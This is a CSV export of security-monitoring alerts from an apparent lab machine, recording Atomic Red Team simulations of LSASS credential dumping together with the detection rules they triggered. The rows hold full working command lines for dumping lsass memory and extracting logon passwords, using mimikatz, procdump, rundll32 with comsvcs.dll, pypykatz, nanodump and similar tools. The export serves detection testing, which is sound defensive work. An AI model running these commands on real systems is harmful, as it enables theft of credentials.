timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 11:00:56.535",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\AtomicRedTeam\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.531",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""C:\\Windows\\System32\\rundll32.exe\"" C:\\windows\\System32\\comsvcs.dll MiniDump 804 C:\\Users\\anshio\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",C:\\Windows\\System32\\rundll32.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:55.409",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:54.336",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:54.335",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:26.789",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  --silent-process-exit \""C:\\Users\\anshio\\AppData\\Local\\Temp\\SilentProcessExit\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:26.788",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:24.823",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:22.919",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:22.848",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe\"" -u -f C:\\Users\\anshio\\AppData\\Local\\Temp\\dotnet-lsass.dmp 804",C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:21.551",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:14.584",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:14.579",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:11.205",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.702",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz  live lsa,C:\\AtomicRedTeam\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.701",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.686",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\"" \""sekurlsa::minidump %%tmp%%\\lsass.DMP\"" \""sekurlsa::logonpasswords full\"" exit",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.677",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  -w \""C:\\Users\\anshio\\AppData\\Local\\Temp\\nanodump.dmp\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.676",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.675",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\AtomicRedTeam\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.673",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:09.672",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""C:\\Windows\\System32\\rundll32.exe\"" C:\\windows\\System32\\comsvcs.dll MiniDump 804 C:\\Users\\anshio\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",C:\\Windows\\System32\\rundll32.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:08.443",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:07.254",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:07.253",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:39.640",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  --silent-process-exit \""C:\\Users\\anshio\\AppData\\Local\\Temp\\SilentProcessExit\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:39.637",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:37.028",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:35.579",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:34.208",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:27.606",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:27.526",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:23.746",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:23.699",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz  live lsa,C:\\AtomicRedTeam\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:23.683",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
